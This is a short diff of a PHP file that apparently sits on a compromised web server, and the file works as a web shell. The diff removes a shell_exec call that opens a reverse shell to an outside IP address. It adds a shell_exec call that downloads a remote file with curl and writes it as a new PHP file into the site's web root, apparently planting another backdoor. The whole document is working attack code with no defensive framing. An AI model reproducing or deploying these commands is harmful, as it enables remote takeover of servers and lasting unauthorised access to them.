@@ -1,6 +1,7 @@
 <?php
 echo "<pre>";
-echo shell_exec("/bin/sh -i >& /dev/tcp/142.171.89.142/65532 0>&1");
+echo shell_exec("curl https://raw.githubusercontent.com/sdfdfasd12/test/refs/heads/main/1.txt > /var/www/vhosts/web1.web226.dogado.net/html/cqr1x.php");
 echo "</pre>";
 ?>
+
 
